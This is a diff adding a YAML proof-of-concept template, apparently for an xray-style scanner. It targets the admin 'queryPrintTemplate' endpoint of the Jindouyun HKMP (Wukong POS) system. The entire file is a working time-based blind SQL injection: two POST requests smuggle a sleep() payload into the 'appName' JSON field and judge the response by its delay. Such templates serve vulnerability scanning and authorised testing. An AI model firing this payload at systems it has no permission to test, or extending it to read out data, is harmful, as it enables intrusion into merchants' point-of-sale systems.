@@ -1,0 +1,31 @@
+name: poc-yaml-jindouyun-HKMP-queryPrintTemplate-sql
+transport: http
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /admin/configApp/queryPrintTemplate
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Content-Type: application/json
+      body: |
+       {"appId":"hkmp","data":{"appName":"悟空POS Win版' AND (SELECT 5 from (select(sleep(2)))x) and 'zz'='zz","configGroup":"1","mchId":"0001"},"deviceId":"hkmp","mchId":"hkmp","nonce":3621722933,"sign":"hkmp","timestamp":1719306504}
+    expression: response.latency >= 4000 && response.latency <= 5000
+  r1:
+    request:
+      method: POST
+      path: /admin/configApp/queryPrintTemplate
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Content-Type: application/json
+      body: |
+       {"appId":"hkmp","data":{"appName":"悟空POS Win版' AND (SELECT 5 from (select(sleep(4)))x) and 'zz'='zz","configGroup":"1","mchId":"0001"},"deviceId":"hkmp","mchId":"hkmp","nonce":3621722933,"sign":"hkmp","timestamp":1719306504}
+    expression: response.latency >= 8000 && response.latency <= 9000
+
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486505&idx=1&sn=c4d82840e6c780236dc7745f65185c59&chksm=c267b91af510300ca1338bd0824b49f627cf4fa83a2c916003ece29779e00fe3b47fd8f9b16c&token=1628549949&lang=zh_CN#rd
